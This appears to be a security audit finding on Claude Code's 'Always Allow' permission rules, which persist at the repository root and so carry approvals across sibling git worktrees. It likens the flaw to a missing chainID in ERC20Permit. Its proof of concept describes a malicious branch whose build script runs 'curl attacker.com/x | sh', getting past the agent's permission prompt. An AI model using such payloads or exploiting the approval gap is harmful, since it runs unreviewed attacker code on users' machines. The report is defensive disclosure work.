### Title
Worktree-scoped permission approvals persist and are honored across sibling worktrees without domain separation - (File: `CHANGELOG.md`, entry for v2.1.211 / `plugins/security-guidance/hooks/gitutil.py`)

### Summary
Claude Code's "Always Allow" permission-rule persistence was changed to save rules at the git repository root rather than scoped to the specific worktree the approval was granted in, per the documented change: "Changed 'always allow' permission rules to save at the repository root, so approvals granted in a git worktree persist across sessions and worktrees." This is structurally the same class of bug as the ERC20Permit missing-`chainID` issue: an authorization artifact (a signed permit / an "always allow" approval) is scoped and generated in one context (one fork / one worktree checkout) but is accepted as valid in a different context (a different fork / a different worktree) that the approving party never actually reviewed or intended to grant permission for.

### Finding Description
The ERC20Permit report's root cause is that the signed authorization omits a domain-separating value (`chainID`), so a permit valid on one chain is replayed as valid on a divergent fork. The analogous trust-boundary issue in claude-code is that "Always Allow" Bash/tool permission approvals are keyed and persisted at the repository-root level (shared `.git` common dir, confirmed by `_git_dir()`'s comment in `plugins/security-guidance/hooks/gitutil.py` lines 156-165: "a commit reviewed in one worktree counts as reviewed if a different worktree later pushes it") rather than being scoped to the worktree/session in which the human actually reviewed and approved the command. Multiple worktrees of the same repository can have materially different code (different branches, potentially attacker-controlled content merged into one branch but not another), yet an approval a user granted while working in worktree A silently authorizes the same rule pattern in worktree B, C, etc., because the persisted rule doesn't carry a worktree/branch identity — the equivalent of a missing `chainID` in the permit schema. ### Impact Explanation
If a user reviews and "Always Allows" a Bash command pattern (e.g., `Bash(npm run build:*)` or a broader wildcard) while working in one worktree/branch where they've inspected the relevant scripts, that same rule is silently honored in every other worktree of the same repository — including one checked out to a different, untrusted, or attacker-influenced branch (e.g., a PR branch checked out via `EnterWorktree`/`--worktree`). A malicious branch that redefines the approved command (e.g., an npm script, git hook, or aliased binary) can leverage the cross-worktree-honored approval to execute unreviewed, attacker-controlled logic without prompting the user — an unauthorized action bypassing the approval boundary the user believed was scoped to the code they reviewed.

### Likelihood Explanation
This requires only ordinary use of the documented worktree-isolation features (`--worktree`, `EnterWorktree`, background-agent worktree isolation) that Claude Code actively promotes for parallel/isolated work, combined with an "Always Allow" grant in one worktree. No privileged access is needed; a normal user who works across multiple worktrees of the same repo (common in agentic/parallel workflows) is inherently exposed, and an attacker who can get any content into a sibling branch/worktree (e.g., via a PR the user pulls into a new worktree) can trigger the divergent-context replay.

### Recommendation
Short term, scope "Always Allow" persistence to include a domain-separating identity — the worktree path and/or the current branch/commit — analogous to adding `chainID` to the permit schema, so an approval is only honored in the exact worktree context where it was granted, or require re-confirmation when the rule is evaluated in a worktree whose HEAD differs from the one active at approval time. Long term, audit all other "approve once, trust broadly" caches (MCP OAuth grants, managed-settings consent, cross-session `SendMessage` trust) for similar domain-separation gaps, and document to users that "Always Allow" in a multi-worktree repository is a repo-wide, not branch-scoped, grant.

### Proof of Concept
1. Clone a repo and create worktree A (`claude --worktree feature-a`) on a trusted branch.
2. In worktree A, run a command like `npm run build` and select "Always Allow" for `Bash(npm run build:*)`.
3. Create worktree B (`claude --worktree feature-b`) checked out to a branch where `package.json`'s `build` script has been altered (e.g., by a PR) to run `curl attacker.com/x | sh`.
4. In worktree B, ask Claude to run `npm run build`. Per the v2.1.211 change, the rule persisted at the repository root auto-approves the command with no prompt, executing the attacker-controlled script without the user ever reviewing or approving it in that worktree's context. [1](#0-0)
